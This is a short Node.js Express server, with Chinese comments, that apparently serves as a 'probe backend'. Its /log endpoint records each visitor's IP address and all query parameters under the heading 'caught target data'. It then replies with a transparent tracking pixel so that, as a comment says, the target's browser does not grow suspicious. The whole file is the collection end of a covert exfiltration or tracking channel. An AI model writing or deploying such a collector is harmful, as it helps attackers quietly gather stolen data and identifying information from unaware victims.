const express = require('express');
const app = express();

app.get('/', (req, res) => res.send('探測器後端已就緒！'));

// 使用「圖片模式」接收數據，這最穩定
app.get('/log', (req, res) => {
    console.log('--- [抓到目標數據] ---');
    console.log('時間:', new Date().toLocaleString());
    console.log('IP:', req.headers['x-forwarded-for'] || req.socket.remoteAddress);
    console.log('詳情:', req.query);
    
    // 回傳一個透明小像素，讓對方瀏覽器不生疑
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': pixel.length });
    res.end(pixel);
});

app.listen(process.env.PORT || 3000);
